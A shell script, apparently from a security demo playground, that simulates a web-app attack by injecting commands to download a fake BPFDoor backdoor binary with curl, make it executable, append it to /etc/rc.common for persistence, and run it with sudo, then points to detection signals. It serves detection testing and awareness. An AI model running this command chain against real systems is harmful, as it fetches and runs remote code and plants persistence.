#!/usr/bin/sh

# Source the helper functions
. "$(dirname "$0")/../../scripts/tool.sh"

# Parse command line arguments
parse_args "$@"

print <<EOF
\033[1;37m# Educational Security Simulation\033[0m

\033[1;33m⚠️  WARNING: This is a SIMULATION for demonstration purposes only! ⚠️\033[0m

${PURPLE}This demonstration simulates a web application attack by deploying a \
fake BPFDoor network backdoor and making it persistent. The attack exploits a command \
injection vulnerability in the target web application, allowing us to execute \
arbitrary commands on the server. We will download a simulated BPFDoor backdoor \
(harmless demo binary), configure it for persistence, and execute it to demonstrate \
how network backdoors establish covert communication channels. This is purely for \
educational and security awareness purposes.\033[0m

\033[1;33mThe backdoor used in this simulation is FAKE and HARMLESS.\033[0m
EOF

step <<EOF
\033[1;35mInitial Payload Delivery - Download Simulated Backdoor Binary\033[0m

${PURPLE}In this first step, we exploit the command injection vulnerability to \
download a simulated BPFDoor network backdoor from a remote repository. \
We use curl with the -OL flags to follow redirects and save the file with its \
original name. The simulated backdoor binary will be downloaded to the web \
server's document root directory, making it accessible and ready for \
execution. Note: This is a harmless demonstration binary.\033[0m
EOF
wait_for_confirmation
inject "curl -OL https://raw.githubusercontent.com/DataDog/datadog-security-playground/main/assets/bpfdoor/fake-bpfdoor.x64"

step <<EOF
${PURPLE}Privilege Escalation - Set Execution Permissions\033[0m

${PURPLE}Now we need to make the downloaded simulated backdoor binary executable \
by setting the appropriate file permissions. We use the chmod command with \
the +x flag to add execute permissions for the owner, group, and others. \
This step is crucial because without execution permissions, the simulated \
backdoor binary cannot be executed, even if we attempt to run it directly. \
This demonstrates how real attackers would prepare their payloads.\033[0m
EOF
wait_for_confirmation
inject "chmod +x fake-bpfdoor.x64"

step <<EOF
${PURPLE}Persistence Mechanism - Establish Startup Persistence\033[0m

${PURPLE}To demonstrate how backdoors survive system reboots and maintain \
persistence, we add the simulated backdoor path to the system's startup \
configuration file (/etc/rc.common). This file is executed during system \
initialization, ensuring that our simulated backdoor would automatically \
start every time the system boots up. We use bash -c to properly handle \
the redirection operator and append the backdoor path to the startup file. \
This shows the persistence techniques used by real attackers.\033[0m
EOF
wait_for_confirmation
inject "bash -c 'echo /app/fake-bpfdoor.x64 >> /etc/rc.common'"

step <<EOF
${PURPLE}Simulated Backdoor Execution - Launch Demo Network Backdoor\033[0m

${PURPLE}In the final step, we execute the simulated BPFDoor backdoor binary to \
demonstrate how network backdoors establish covert communication channels. \
The backdoor will masquerade as a legitimate system process (haldrund), \
daemonize itself, and start listening for network traffic using BPF filters \
and raw sockets. It will wait for packets containing a specific magic \
signature to trigger responses. This step demonstrates network backdoor \
deployment methodology, but uses a harmless demo binary.\033[0m
EOF
wait_for_confirmation
inject "sudo /app/fake-bpfdoor.x64"

print <<EOF
${GREEN}Demostration simulation completed successfully!\033[0m

${YELLOW}You can now view the signals in the DataDog Workload Protection App.\033[0m
EOF
